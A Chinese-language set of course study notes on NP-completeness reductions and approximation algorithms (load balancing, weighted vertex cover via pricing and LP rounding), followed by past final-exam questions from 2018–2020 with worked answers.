（10分）\n\n答：从点覆盖问题规约过来（2分）。\n\n对于一个点覆盖实例 G，构造一个该问题实例 G'；（1分）\n对 G 中每一条边 ab，都添加一个新的顶点 c 然后连成三角形 abc。（4分）\n说明 G 存在大小为 k 的点覆盖当且仅当 G' 存在一个大小为 k 的解。（3分）\n\n#### ➂题目3\n\n(2019)证明独立集问题（给定一个图，问图中是否存在k个顶点的子集，使得这个子集中任意两个顶点之间在原图中都不存在边）是NP完全的。\n\n答：从点覆盖问题规约过来\n\n**⇒** \n\n​\tS 是图 G 的任一独立集\n​\t则任意边 (u,v)∈E，有u ∉ S 或 v ∉ S；那么 u∈V-S 或 v∈V-S\n​\t所以图的任意边至少有一个端点在集合 V-S 中，集合 V-S 是一个点覆盖\n\n**⇐** \n\n​\tV-S 是图 G 的任一点覆盖\n​\t则任意边 (u,v) ∈ E，有 u ∈ V-S 或 v ∈ V-S ；那么 u ∉ S 或 v ∉ S\n​\t所以图的任意边至少有一个端点不在集合 S 中，集合 S 是一个独立集\n\n∴  Vertex-Cover ≡<sub>p</sub> Independent Set，即独立集问题NP完全的\n\n#### ➃题目4\n\n最长路径问题：给定简单无向图中是否存在长度大于等于k的简单路径？请证明这个问题是NP完全问题。\n\n\n\n<table>\n    <tbody>\n        <tr>\n            <td><input type=\"text\" placeholder=\"🔔请输入文章查看码，看更多内容\"></td>\n            <td><button class=\"btn\">Button</button></td>\n        </tr>\n</tbody></table>\n\n\n## ⑧近似算法\n\n> **本章重点：**\n>\n> - 理解为什么会有近似算法，什么是近似算法，如何评价近似算法的优劣。\n> - 掌握负载均衡问题的近似算法及其近似比证明。\n> - 掌握带权重的顶点覆盖问题的定价算法，证明该方法能得到一个2倍近似解。\n> - 理解带权重的顶点覆盖问题的整数规划模型如何建立的，理解松弛求解方法。\n> - 能够对一个图问题建立整数规划模型(如：带权重的顶点覆盖问题，广义负载均衡问题)。\n> - 理解求解0-1背包问题的基于取整法的近似算法。\n> - 能够设计简单的近似算法，并证明该算法是几倍近似算法。\n\n### ❶基础知识\n\n#### ➀概念\n\n近似的想法很简单，要解决一个问题，我们希望能够做到\n\n- ①求解结果是最优的 \n- ②在多项式时间内解决 \n- ③对于任意的实例都能够通过该算法解决。\n\n现在对于部分问题，无法完全满足以上要求，所以就牺牲了①，但是我们希望结果不是盲目的，所以就引入了近似的概念。近似算法其实是针对NP难问题的一种退让，对于许多 P 不等于 NP 的最优化问题，无法在多项式时间内找到最优解。因此，如果可以只求一个我们可以接受的解，而不是非要最优解，那么可能存在一个多项式时间的算法。\n\n#### ➁思想\n\n放弃求解最优解，用近似最优解代替最优解，以此换取：\n- 算法设计上的简化\n- 时间复杂性的降低\n\n#### ➂性能\n\n近似算法通常采用两个标准来衡量性能：\n\n- 算法的时间复杂度（必须为多项式级的）\n- 解的近似程度（可能与算法设计、问题规模、输入实例等有关）\n\n### ❷负载均衡问题\n\n> 掌握负载均衡问题的近似算法及其近似比证明\n\n`问题描述：`有 m 台相同机器，n 个任务，任务 j 的处理时间为 t<sub>j</sub>，每个任务只能在一台机器上连续工作，一台机器同一时间只能处理一个任务。我们认为完成最后一个任务所需的时间为负载时间，希望能够让这个负载时间最短。\n\n机器 i 的负载(机器 i 处理任务的时间之和)：L[i] = ∑<sub>j∈S[i]</sub> t<sub>j</sub> ，S[i] 为分配给机器 i 的任务集合\n最优工期(完成所有工作的最短时间跨度[makespan])：L<sup>∗</sup> = max<sub>i</sub>L[i]\n\n优化问题：寻找一个分配方案最优工期\n决策问题：是否存在一个分配方案使工期为 L<sup>∗</sup>\n\n**两个引理：**\n\n- **引理1：**L<sup>∗</sup> ≥ max(t<sub>j</sub>)（最优工期大于等于完成最长的工作所需时间）\n- **引理2：**L<sup>∗</sup> ≥ (1/m)∑<sub>j</sub>t<sub>j</sub> （最优工期大于等于所有任务的平均时间)\n\n负载均衡问题是 NPH 问题，因为分割问题 ≤<sub>p</sub> 负载均衡问题\n\n#### ➀2倍近似算法-List Scheduling\n\nList Scheduling 是一种贪心策略，它的核心思想是将各个工作依次安排到累计工作时长最短的机器中，下面的动图显示了这一过程。可以发现，这种贪心的初衷只考虑了眼前的最小值，而局部最优解并不一定是最终的最优解。\n\n![](https://img.jwt1399.top/img/202111122021025.webp)\n\n`2倍近似度证明：`\n\n设机器 i 是瓶颈机器(则 L[i] 为贪心解)，任务 j 是最后一个在机器 i 上调度的任务（在调度前，机器 i 的工期是最小的）我们在考虑放入最后一个任务前，根据我们放置的规则，该机器 i 是所有机器中耗时最短的(L[i] − t<sub>j </sub>≤ L[k])，该机器此时的用时(L[i] - t<sub>j</sub>)是低于除掉最后一个任务 j 后的平均时长(1/m)∑<sub>k</sub> L[k]，更低于所有任务的平均时长(1/m)∑<sub>j</sub>t<sub>j</sub>(引理2)；再根据引理1，最后一个任务应该是小于最优解的。\n\nL[i] − t<sub>j </sub>≤ L[k]，对任意 1 ≤ k ≤ m\n\nL[i] − t<sub>j</sub> ≤ (1/m) ∑<sub>k</sub>L[k] \n\n​\t\t\t\t≤ (1/m)∑<sub>j</sub>t<sub>j</sub> \n\n​\t\t\t\t≤ L<sup>∗</sup> \n\nL<sup>∗</sup>  = L[i] = (L[i] − t<sub>j</sub>) + t<sub>j</sub> ≤ 2L<sup>∗</sup> \n\nL[i] − t<sub>j</sub> ≤  L<sup>∗</sup> ，t<sub>j</sub> ≤ L<sup>∗</sup> \n\n∴ L[i] ≤ 2L<sup>∗</sup> \n\n#### ➁3/2倍近似算法-LPT Rule\n\n上述贪心策略存在一个很明显的漏洞，当最后加入的工作所花时间最长时，效果很差。因此我们希望先安排长工作，将所有工作**按花费时间降序排列**，再执行上述贪心算法，这就是 Longest Processing Time Rule 的核心思想。\n\n`3/2倍近似度证明：`\n\n当 n ≤ m 时，则每台机器最多安排一个工作，容易找到最优解。 当 n ≥ m 时，先将 m 个任务安排到 m 台机器，那么对第 m+1 个工作，有 2t<sub>m+1</sub> ≤ L<sup>∗</sup> （瓶颈机器至少要做两个任务，两个任务的时间总和 ≥ 2t<sub>m+1</sub>）\n\n由上面证明可得：L[i] − t<sub>j</sub> ≤  L<sup>∗</sup> \n\n又∵ 2t<sub>m+1</sub> ≤ L<sup>∗</sup> ⇒ t<sub>j</sub> ≤ (1/2)L<sup>∗</sup> \n\nL<sup>∗</sup>  = L[i] = (L[i] − t<sub>j</sub>) + t<sub>j</sub> ≤ (3/2)L<sup>∗</sup> \n\n∴ L[i] ≤ (3/2)L<sup>∗</sup> \n\n但其实 2/3 倍近似并不是紧密的，Graham 在1969年，计算出 LPT Rule 是负载均衡问题的一个 4/3 近似算法。因此 4/3 倍近似才是紧密的。\n\n\n### ❸带权顶点覆盖问题\n\n> 掌握带权重的顶点覆盖问题的定价算法（Pricing method），证明该方法能得到一个2倍近似解；\n>\n> 理解带权重的顶点覆盖问题的整数线性规划(Integer linear programming)模型如何建立的，理解松弛求解方法；\n>\n> 要求会对一个图问题建立整数线性规划模型（以点覆盖问题为例）\n\n`问题描述：`对于顶点覆盖问题（一个点的集合使得图中所有边至少有一个端点在集合内），带权点覆盖问题中，需要满足这个集合中所有点的权值之和最小。\n\n如下图左边就是一个带权的最小顶点覆盖\n\n![](https://img.jwt1399.top/img/202111122306124.png)\n\n#### ➀2倍近似算法-Pricing method\n\n给每条边 e = (i,j) 赋予一个价格 p<sub>e</sub> ≥ 0 ，任意顶点 i 的权重大于等于与其邻接的所有边价格总和：∑<sub>e=(i,j) </sub>p<sub>e </sub>≤ w<sub>i</sub>\n\n**公平引理：**对于任意顶点覆盖集合 S 和任意公平价格 p<sub>e</sub> ，有∑<sub>e</sub> p<sub>e </sub>≤ w(S)\n\n![](https://img.jwt1399.top/img/202111131323355.png)\n\n 算法：任选一条边 (i, j) 加上代价，这个代价从零开始，且这个代价的最大值小于 i 和 j 节点的权值。显然，这个边权值的最大值取决于两个端点权值的最小值，我们认为当边权值与点权值相等时，对应的那个点是紧的。把所有紧的点找出来即为顶点覆盖。\n\n定价法求解点覆盖问题，举例如下：\n\n![](https://img.jwt1399.top/img/202111131334754.png)\n\n上图中，最后 tight 的点 {a, b, d}，即为最小的带权点覆盖，权为 10\n\n`2倍近似度证明：`\n\n设 S 为算法终止时所有紧节点的集合。易得 S 是顶点覆盖（反证：如果某条边没有被覆盖到，则其两个端点都没有覆盖很紧，算法不会终止）\n\nw(S) 等于所选的节点的权值之和，等于所选节点所对应的边权之和，可以把它放大到所有节点对应边权之和，这样因为一条边 (u, v) 在 u 上算过一次后还要在 v 上算一次，所以等于边权和的两倍。再由上面公平引理可得。\n\n![](https://img.jwt1399.top/img/202111131352401.png)\n\n∴ 定价算法是2倍近似算法\n\n#### ➁2倍近似算法-ILP\n\n对每一个点 i ，用 bool 变量 x<sub>i</sub> 表示其是否在点覆盖集合中。\n\n- x<sub>i</sub>=0，表示点 i 不在点覆盖中；\n- x<sub>i</sub>=1，表示点 i 在点覆盖中。\n\n因此，整数规划带权点覆盖问题转换为：\n\n![](https://img.jwt1399.top/img/image-20211126210059636.png)\n\n如果 x<sup>\\*</sup> 是 ILP 的最优解，那么 S= { i∈V｜x<sub>i</sub>*=1 }是最小权重顶点覆盖。\n\n点覆盖的整数规划是一个NP难问题，因此我们希望能找到它的近似算法，牺牲准确度以快速求解。很容易想到把它转化为线性规划问题(LP)，并找到它的近似程度。建立如下线性规划，与整数线性规划区别在于第三式。\n\n![](https://img.jwt1399.top/img/image-20211126211321308.png)\n\n线性规划的约束条件不如整数规划苛刻，所以**线性规划(LP)的最优解 ≤  整数规划(ILP)的最优解**。\n\n但会带来一个问题，加入点覆盖集合中的点 i 其 x<sub>i</sub> 极有可能是分数，会呈现如下形式\n\n![](https://img.jwt1399.top/img/202112091214071.png)\n\n**定理：** 如果 x<sup>\\*</sup> 是 LP 的最优解，那么点覆盖S=\\{i∈V｜x<sub>i</sub>* ≥ 1/2}，且是准确解的2倍近似。\n\n`2倍近似度证明：`\n\n对于边 (i,j) ∈ E，点覆盖中有 x<sub>i</sub>* + x<sub>j</sub>*  ≥ 1，则 x<sub>i</sub>* ≥ 1/2 或 x<sub>j</sub>* ≥ 1/2  ⇒ 边 (i,j) 被覆盖\n设ILP点覆盖的最优顶点覆盖为 S* ，有\n\n     ![](https://img.jwt1399.top/img/image-20211126213525333.png)\n\n第一个不等式：根据整数规划的最优解不小于线性规划这一性质放缩；\n第二个不等式：x<sub>i</sub>* ≥ 1/2 \n\n⇒∑<sub>i∈S</sub> W<sub>i</sub> ≤ 2∑<sub>i∈S\\*</sub> W<sub>i</sub> \n\n∴ 整数规划是2倍近似算法\n\n### ❹01背包问题\n\n。。。\n\n### ❺真题练习\n\n#### ➀题目1\n\n(2020)给定正整数集合 A = {a<sub>1</sub>,a<sub>2</sub>,a<sub>3</sub>,…,a<sub>n</sub>} 和正整数 b，b ≥ max {a<sub>1</sub>,a<sub>2</sub>,a<sub>3</sub>,…,a<sub>n</sub>}。当集合 A 的子集 S∈A 中的元素之和小于等于 b 时，即 ∑<sub>a<sub>i</sub>∈S[i]</sub> a<sub>i</sub>≤b，我们称 S 为可行集。请寻找元素之和最大的可行集 S 。例如，A = {8,2,4}，b= 11，则最优的可行集为 S = {8,2}，最优解为 8＋2=10 (10分)\n\n(1)下面是求解这个问题的算法。集合 S 初始为空集；按照下标 i 从小到大的顺序依次考察集合 A 中的每个整数 a<sub>i</sub>，如果 α<sub>i</sub> + ∑<sub>a<sub>k</sub>∈S</sub> a<sub>k</sub>＜b ，则将 a<sub>i </sub>添加集合 S 中，即 S = S U {a<sub>i</sub>}。证明这个算法不是1/2倍近似算法。(3分)\n\n------\n\n设集合 A = {1，4}，b = 4\n\n根据该算法求得可行集 S = {1} ，解为 ∑S = 1 \n\n​           而最优可行解 S* = {4}，最优解 ∑S* = 4\n\n⇒ ∑S = (1/4)∑S* < (1/2)∑S*\n\n∴该算法不是1/2倍近似算法\n\n------\n\n(2)为该问题设计O(nlogn)时间复杂度的近似算法，并证明该算法是1/2倍近似算法(7分)\n\n------\n\n在 (1) 中 所给算法基础上对集合 A 进行降序归并排序[O(nlogn)]\n\n即： a<sub>1</sub>＞a<sub>2</sub>＞a<sub>3</sub>＞…＞a<sub>k</sub>＞a<sub>k+1</sub>＞...＞a<sub>n</sub>\n\n证明：设 a<sub>k</sub> 为可行集最后一个元素\n\na<sub>k </sub>≥ a<sub>k+1 </sub>⇒ ∑S ≥ a<sub>k+1 </sub>   ------①\n\na<sub>k</sub> 为可行集最后一个元素 ⇒ ∑S ≥ b - a<sub>k+1 </sub>------②\n\n①+② ： ∑S ≥ (1/2)b ，再又 b ≥ ∑S*\n\n⇒∑S ≥ (1/2)∑S*\n\n∴ 该算法是 1/2 倍近似算法\n\n------\n\n#### ➁题目2\n\n(2018)叙述带权重的点覆盖问题的竞价法（Pricing method）的步骤。\n\n答：任选一条边 (i, j) 加上代价，这个代价从零开始，且这个代价的最大值小于 i 和 j 节点的权值。显然，这个边权值的最大值取决于两个端点权值的最小值，我们认为当边权值与点权值相等时，对应的那个点是紧的。把所有紧的点找出来即为顶点覆盖。\n\n#### ➂题目3\n\n(2019)简单证明定价算法（Pricing method）求解带权重的点覆盖（Weighted Vertex Cover）问题是2倍近似的。\n\n答： S 为算法终止时所有紧节点的集合。易得 S 是顶点覆盖（反证：如果某条边没有被覆盖到，则其两个端点都没有覆盖很紧，算法不会终止）\n\nw(S) 等于所选的节点的权值之和，等于所选节点所对应的边权之和，可以把它放大到所有节点对应边权之和，这样因为一条边 (u, v) 在 u 上算过一次后还要在 v 上算一次，所以等于边权和的两倍。再由上面公平引理可得。\n\n![](https://img.jwt1399.top/img/202111131352401.png)\n\n∴ 定价算法是2倍近似算法\n\n#### ➃题目4\n\n为最大独立集问题建立一个整数规划模型。    （5分）\n\n 参考答案：\n 目标函数： max  ∑ x<sub>i</sub>              \t\t\t\t（2分）\n 条件：对每一条边(i,j)，  x<sub>i</sub> + x<sub>j</sub>  ≤ 1         （2分)\n    \t\t    对每个顶点i， x<sub>i</sub>  = 0,1\t\t\t\t（1分)\n\n\n\n## ⑨历年期末真题\n\n>题目来源于课堂，由小简拍下来，手工整理，因此或多或少存在一些错误，望谅解！\n\n### ❶选择题\n\n#### 样题\n\n一、判断下列陈述的对错（共20分，共 10题，每题2分）\n\n1. 一个计算问题的输入是n个数字a<sub>1</sub>，a<sub>2</sub>，…，a<sub>n</sub>。如果这个问题存在一个运行时间为O(a<sub>n</sub>n<sup>10</sup>)的算法，则这个问题可以在多项时间内被计算机求解。 `(F)`\n2. 如果存在一个从问题A到问题B的多项式时间归约（Polynomial reduction），且问题A是NP难的，则可知问题B也是NP难的。 `(T)`\n3. 一个2倍的近似算法一定会有在一个问题上得到正好是最优解的两倍的解。`(F)`                                                     \n4. 如果存在一个NP问题有多项式时间算法，则P=NP。`(F)`\n5. 一个图上的最大网络流是唯一的。 `(F)`\n6. 当图中的顶点个数是常数时，最大独立集问题（Maximum Independent Set Problem）是多项式时间可解的.  `(T)`\n7. 这里有两个解决排序问题的分而治之算法：算法A递归将需要排列的数字均分成2份，分别排序后再合并。算法B递归将需要排列的数字均分成3份，分别排序后再合并。从渐进分析的角度来看，算法B比算法A要快。`(F)`\n8. 在并行计算中，一个计算问题能在CREW PRAM模型下O(n)处理器O(n<sup>3</sup>)时间被解决，则也可以在EREW PRAM模型下O(n)处理器O(n<sup>3</sup>)时间被解决.`(T)`\n9. 对于任意一个动态规划算法，其使用的空间一定不比它使用的时间要大。`(T)`\n10. 求一个图中两个点间最长路径的问题是属于NP的，但是求一个图中两个点间最短路径的问题则不是属于NP的。`(F)`\n\n#### 2018\n\n一、判断下列陈述的对错（共30分，共 15题，每题2分）\n\n1. 任何一个NP问题能被多项式时间算法解决则所有NP问题都能在多项式时间内被解决。`（F）`\n2. 可以用如下方法来证明某结论X成立：先假设X不成立，在此假设基础上推导出X成立，则可以证明X成立。`（T）`                      \n3. 一个2倍近似算法得到的解总比一个4倍近似算法得到的解更好。`（F）`\n4. 问一个图是否存在一个大小为k的点覆盖，很容易证明该问题是属于NP的；但是，问一个图是否不存在一个大小为k的点覆盖，却是很难证明这个问题是否属于NP。 `(T)`\n5. 一个问题A可以多项式时间规约到一个NP完全问题B，那么问题A可能属于P也可能属于NP完全。`(T)`                                    \n6. 一个3倍近似算法如果对任何问题实例找到的解都在最优解的1.5倍以内，则这不是一个3倍近似率的算法。`（F）`                        \n7. 对某个问题以前最好的算法运行时间为O(n<sup>3</sup>)，新给出的算法运行时间为O(n<sup>2</sup>)。那么在该问题上运行时间改进了O(n)。`(F)`\n8. 对于判断一个整数w是不是素数的问题，一个运行时间为O(w<sup>2</sup>)的算法是多项式时间算法，而一个运行时间为O(2<sup>w</sup>)的算法是指数时间算法。`(F)`\t\n9. 证明一个算法不是2倍近似算法只需要构造一个例子使得在该例子上返回的解超过2倍最优解即可。`(T)`                                     \n10. 如果一个图上两点间的最大流是唯一的，则可以确定这两点间的最小割也唯一。 `(F)`                                                     \n11. 证明把问题A规约到了问题B，只需要证明对于任意问题A的实例 I 都可以构造一个问题B的实例 I' 使得实例 I' 的任意解可以构造出实例 I 的一个解。`（F）`\n12. 动态规划算法有可能是多项式时间的也有可能是指数时间的。`（T）`\n13. 一个二分图如果包含奇数个顶点，则这个图一定不存在一个哈密尔顿圈。`（T）`\n14. 不属于NP中的问题一定不存在多项式时间算法。`（F）`\n15. 对于每秒可以处理100万条基本指令的计算机，一个运行时间为 1.5<sup>n</sup> 的算法在 n=100 的例子上可以1年内计算完。`(F)`       \n\n#### 2019\n\n一、判断下列陈述的对错（共20分，共 10题，每题2分）\n\n1. 在背包问题中，如果规定所有输入的数值(包括背包的大小和各个物品的价值和体积)都是长整型数据，则动态规划算法可以在多项式内求解。`(T)`\n2. NP问题是目前没有找到多项式时间求解算法的判定问题集合。`(F)`\n   - NP问题是所有可用多项式时间算法验证其猜测准确性的问题的集合。 \n3. 线性规划问题可以多项式求解，但是整数规划问题是NP-hard问题。`(T)`\n   - 整数规划是NPC，NPC ⊆ NP-hard\n4. 找出一个图的哈密尔顿圈和判定该图是否存在哈密尔顿圈，这两个问题在不考虑多项式时间的差异基础上计算难度是相当的。`(T)`\n5. 一个网络的最大流的值一定不大于任意一个割集的容量。`(T)`\n   - 网络的最大流应等于最小割集容量。\n6. 如果我们不能在一个流网络中找到一条从S到T的路径，使得路径上所有边的流量都小于该边的容量，则我们得到了该网络上S到T的最大流。`(F)`\n7. 证明一个算法不能达到2倍近似解只需要找到一个例子在该例子上得到的解要差于2倍最优解即可。反之，无论给出多少个例子在这些例子上都能得到优于2倍最优解的解也不能说明这个算法拥有2倍近似率。`(T)`\n8. 如果一个问题A存在多项式算法可以推导出所有NP里的问题都存在多项式算法，那么可知问题A是NP完全的`(T)`\n9. 问一个数是不是个合数，很容易证明该问题是属于NP的:但是问一个数是不是素数，这个问题却是很难证明是否属于NP的。`(F)`\n   - 都是 NP\n10. 因为判断一个图是否存在哈密尔顿圈问题是属于NP的，所以判断一个图是否不存在哈密尔顿圈问题也是属于NP的。`(F)`\n    - 不存在是 Co-NP\n\n#### 2020\n\n一、命题正确填T，命题错误填F（2分题x10题=20分）\n\n1. 如果f(n) = O(g(n))，则有log<sub>2</sub>f(n) = O(log<sub>2</sub>g(n))。`(T)`\n2. 一个P类问题可以多项式时间归约到任意一个NP完全问题。`(T)`\n3. 斐波那契数列定义f(1)=f(2)=1，当n≥3时，f(n)=f(n-1)+f(n-2)。求解该数列第n个数f(n)的自顶向下的分治递归算法是指数时间算法，求解该数列第n个数f(n)的自底向上的动态规划算法也是指数时间算法。`(T)`\n   - 考虑输入规模\n4. 给定边上容量均为正整数的流网络，网络流 f 的 ∆ 剩余网络 G<sub>f</sub>(∆) 中不存在从源点 s 到终点 t 的有向路径，如果 ∆ = 1 则 f 是该网络的最大流。`(T)`\n5. 给定求解负载均衡问题的 2 倍近似算法 A 和 3/2 倍近似算法 B，对于该问题的任意实例，算法 B 得到的近似解都比算法 A 得到的近似解更接近最优解。`(F)`\n6. 给定带权重的顶点覆盖问题，利用整数规划模型求得的顶点覆盖的最小权重之和为 x ，利用松驰化的线性规划模型求得的顶点覆盖的最小权重之和为 y，则总有x≤y。`(F)`\n7. 判断给定简单无向图中是否不存在哈密尔顿圈是 NP 完全问题。`(F)`\n   - co-NP\n8. 给定两个判定问题 A 和 B ，如果 A ≤<sub>p</sub> B，B ≤<sub>p</sub> A，并且 A ∈ NPC，那么 B ∈ NPC。`(F)`\n   - A 是否是 NP\n9. 如果判断问题 A 存在多项式时间的求解算法，那么问题 A 是 P 问題，不是NP问题。`(F)`\n   - 是 P 肯定是 NP\n10. 给定两个判定问题 A 和 B，A ≤<sub>p</sub> B 的意思是说，可以通过多项式次的调用求解问题 B 的方法来求解问题 A，也就是说，如果问题 B 可以多项式时间求解，则问题 A 可以多项式时间求解。`(T)`\n\n### ❷计算题&简单题\n\n#### 样题\n\n二、计算题（共9分，共3题，每题3分）\n1. 求如下有向图中的一个最长路径，要求给出路径和路径长度的值。\n\n   ![](https://img.jwt1399.top/img/image-20211124232947658.png)\n\n​\t\t\t参考答案： CADB，长度：40+30+35=105\n\n------\n\n2. 如下可满足问题（SAT）是否有解，若有解该如何给变量赋值：![](https://img.jwt1399.top/img/image-20211124232912948.png)参考答案：x1=1,x2=1,x3=0或者x1=0,x2=0,x3=0，答案正确即可给分。（说明：本题存在多种解，如x3=1, x1和x2中有一个0，这种情况还是有解。只要任给出一种解就给分)\n\n------\n\n3. 有一些区间段 (0,3), (2,4), (3,6), (5,7), (1,4), (3,5), (6,8),(7,9)，找出其中个数最多的一组相容的区间段（两个区间相容当且仅当两个区间的交集为空)。\n\n   参考答案：（0,3），（3,5），（5,7），（7,9）\n\n------\n\n#### 2018\n\n二、计算题和简答题，计算题可以只写答案不写过程（共16分，共4题，每题4分）\n\n1. 一个数的序列中排在前面的数比排在后面的数要大的话则称为一对逆序。问下面这个序列中存在多少对逆序：5，10，7，9，13，1，8，4，12，2，6，3，11，14。（4分）\n\n   答：4+8+5+6+8+0+4+2+4+0+1+0+0=42\n\n------\n\n2. 负载均衡（Load Balancing）问题要求将一些工作放到一些机械上进行处理，每个工作有一个固定的需要处理的时间。算法的思想如下：将任务按任意一个次序进行排序，再依次将任务分配到负载最轻的机器上。简单证明该算法是2倍近似的。（4分）\n\n   答：设机器 i 是瓶颈机器(则 L[i] 为贪心解)，任务 j 是最后一个在机器 i 上调度的任务（在调度前，机器 i 的工期是最小的）我们在考虑放入最后一个任务前，根据我们放置的规则，该机器 i 是所有机器中耗时最短的(L[i] − t<sub>j </sub>≤ L[k])，该机器此时的用时(L[i] - t<sub>j</sub>)是低于除掉最后一个任务 j 后的平均时长(1/m)∑<sub>k</sub>L[k]，更低于所有任务的平均时长(1/m)∑<sub>j</sub>t<sub>j</sub>(引理2)；再根据引理1，最后一个任务应该是小于最优解的。\n\n   L[i] − t<sub>j </sub>≤ L[k]，对任意 1 ≤ k ≤ m\n\n   L[i] − t<sub>j</sub> ≤ (1/m) ∑<sub>k</sub>L[k] ≤ (1/m)∑<sub>j</sub>t<sub>j</sub> ≤ L<sup>∗</sup> \n\n   L[i] = (L[i] − t<sub>j</sub>) + t<sub>j</sub> \n   \n   L[i] − t<sub>j</sub> ≤  L<sup>∗</sup> ，t<sub>j</sub> ≤ L<sup>∗</sup> \n   \n   ∴ L[i] ≤ 2L<sup>∗</sup> \n\n------\n\n3. 叙述带权重的点覆盖问题的竞价法（Pricing method）的步骤。（4分）\n\n   答：任选一条边 (i, j) 加上代价，这个代价从零开始，且这个代价的最大值小于 i 和 j 节点的权值。显然，这个边权值的最大值取决于两个端点权值的最小值，我们认为当边权值与点权值相等时，对应的那个点是紧的。把所有紧的点找出来即为顶点覆盖。\n\n------\n\n4. 在一个无向图中给出两个顶点对（s1，t1）和（s2，t2），需要求出同时从 s1 流向 t1 的流加上从 s2 流向 t2 的流的和达到最大。有一个算法是：添加一个新的顶点 s 仅连接 s1 和 s2 ，边的容量无穷大；再添加一个新的顶点 t 仅连接 t1 和 t2 ，边的容量无穷大；然后求 s 到 t 的最大流。请分析这个算法的正确性（认为它是错的就给出理由，认为它是对的则也给出说明并分析其时间复杂性）。（4分）\n\n   答：错误。（2分）\n\n   因为这样做将会包含从 s1 到 t2 的流和从 s2 到 t1 的流。（2分）\n\n------\n\n#### 2019\n\n(2019)计算题和简答题，计算题可以只写答案不写过程(共24分，共6题，每题4分)\n\n1. 证明一个有奇数个顶点的二分图一定不存在哈密尔顿圈。(4分)\n\n   > 设G=(V,E)是无向图，如果 V 可以划分为子集 X 和 Y，使得对所有的e=(u,v)∈E, 都有 u 和 v 分属于 X 和 Y，则称 G 是二分图，下图便是一个二分图。\n   >\n   > ![](https://img.jwt1399.top/img/202112072047766.png)\n\n   （数学归纳法）\n\n   当n = 3个顶点时候，明显不存在哈密尔顿圈\n\n   假设当 n = k ，k为奇数时，不存在哈密尔顿圈\n\n   当n = k + 2 时，假设存在哈密尔顿圈\n\n   由于是二分图，圈中相邻顶点属于不同子集，假设ABCD是圈中四个相邻的顶点，则AC在二分图的一个子集 X 中，BD 在子集 Y 中，那么 AD 有边相连，取掉BC两点，链接AD，仍然存在哈密尔顿圈，而剩下点仍然是二分图，与假设矛盾，因此一个有奇数个顶点的二分图一定不存在哈密尔顿圈\n\n\n------\n\n2. 在一个图中给出 x 对顶点 (s<sub>1</sub>,t<sub>1</sub>)，(s<sub>2</sub>,t<sub>2</sub>)，...，(s<sub>x</sub>,t<sub>x</sub>) 求 (s<sub>i</sub>,t<sub>i</sub>) 这 x 对顶点之间同时能达到的最大流(s<sub>i </sub>只能流向 t<sub>i</sub>)。分析如下算法的正确性：添加一个顶点 s 连接所有 s<sub>i </sub>，且 s 到 s<sub>i</sub> 的容量无穷大；添加另一个顶点 t 连接所有 t<sub>i</sub>，且 t 到 t<sub>i</sub> 的容量无穷大；则只需求 s 到 t 之间的最大流。(4分)\n\n   答：正确\n\n------\n\n3. 如下可满足问题(SAT)存在几组使得其值为真的赋值？给出具体的赋值方案。(4分)\n\n   ![](https://img.jwt1399.top/img/image-20211202215006674.png)\n\n   答：x1=1，x2=1，x3=0，x4=0\n\n------\n\n4. 求如下有向图中一条从 A 到 D 的最长路径。要求给出路经和路经长度的值。(4分)\n\n![](https://img.jwt1399.top/img/image-20211202214527833.png)\n\n​\t\t\t\t参考答案： CADB，长度：45+40+35=120\t\t\n\n------\n\n5. 给出如下一个带权重的图，图中每个顶点上的数字为该项点的权重，找出图中一个独立集(一组顶点之间没有任何边称为一个独立集)使得该独立集中顶点的权重之和达到最大。(4分)\n\n   ![](https://img.jwt1399.top/img/image-20211202212817151.png)\n\n   答：3 + 2 + 2 + 7 = 14\n\n   ![](https://img.jwt1399.top/img/image-20211206221643616.png)\n\n------\n\n6. 求解下面两个递归关系式(4分)\n\n   (1)f(n) = 9f(n/3) + O(n<sup>2</sup>)\n\n   答：利用主定理求解\n\n   a = 9，b = 3，f(n) = n<sup>2</sup>，n<sup>log<sub>b</sub>a</sup> = n<sup>log<sub>3</sub>9</sup> = n<sup>2</sup> = f(n)\n\n   所以T(n) = Θ(n<sup>log<sub>b</sub>a</sup>logn) = Θ(n<sup>2</sup>logn)\n\n   (2)f(n) = 3f(n-3) + O(1)\n\n   答：利用直接展开法求解\n\n   详细解题步骤请参考前面[分治算法-真题练习-题目一-第2问](#toc-heading-35)，这里不再赘述。\n\n------\n\n#### 2020\n\n(2020)简答和计算题，无需计算过程，直接给出答案即可(5分题 x 6题 = 30分)\n\n1. 如果  P ≠ NP 时，请给出 P，NP，NPC 这3个集合两两之间的关系。\n\n   答：如果  P ≠ NP 时，P ⊆ NP，NPC ⊆ NP，P ≠ NPC\n\n------\n\n2. 请用下图右侧所示的4种不同形状的L型骨牌，覆盖下图左侧给定棋盘上除阴影方格以外的所有方格，且任何2个L型骨牌不得重叠覆盖，4种L型骨牌数量均不设限制。\n\n   ![](https://img.jwt1399.top/img/image-20211202205116026.png)\n\n​\t\t\t答：\n\n![](https://img.jwt1399.top/img/D3BE67A2-F262-4E2E-8DC0-81053DBB99CB.jpg)\n\n------\n\n3. 给定整数序列{a<sub>1</sub>,a<sub>2</sub>,a<sub>3</sub>,...,a<sub>n</sub>}，如果 i < j 但是 a<sub>i </sub>> a<sub>j</sub>逆序。则(a<sub>i</sub>, a<sub>j</sub>)称为一对逆序，请计算整数序列{32,15,48,17,21,24,57,12,36}中有多少对逆序。\n\n   答：5+1+5+1+1+1+2+0+0=16\n\n------\n\n4. 给出下列2个递归关系式的渐近界。\n   (1)T(n) = 4T(n/2) + n<sup>1.9</sup>(logn)<sup>5</sup>\n\n   答：a = 4，b = 2 ，f(n) = n<sup>1.9</sup>(logn)<sup>5</sup>，n<sup>log<sub>b</sub>a</sup> = n<sup>log<sub>2</sub>4</sup> = n<sup>2</sup> > f(n)\n\n   因此 T(n) = Θ(n<sup>log<sub>b</sub>a</sup>) = Θ(n<sup>2</sup>)\n\n   (2)T(n) = T(2n/3) + 1\n\n   答：a =1，b = 3/2 ，f(n) = 1，n<sup>log<sub>b</sub>a</sup> = n<sup>0</sup> = 1 = f(n)\n\n   所以T(n) = Θ(n<sup>log<sub>b</sub>a</sup>logn) = Θ(logn)\n\n------\n\n5. 给定整数序列(23，4，-2，30，- 63，47，26，-53，58，97，-93，-23，84，-15，6),求这个序列的最大连续子序列之和，并给出相应的子序列。例如序列(-20，11，-4，13，-5，-2)的最大连续子序列之和为 20 = sum(11, 4,13)。\n\n   答：175 = sum(47,26,-53,58,97)\n\n------\n\n6. 将下列6个函数按渐近增长率由低至高进行排序。\n   f<sub>1</sub>(n) = log<sup>100</sup>n + 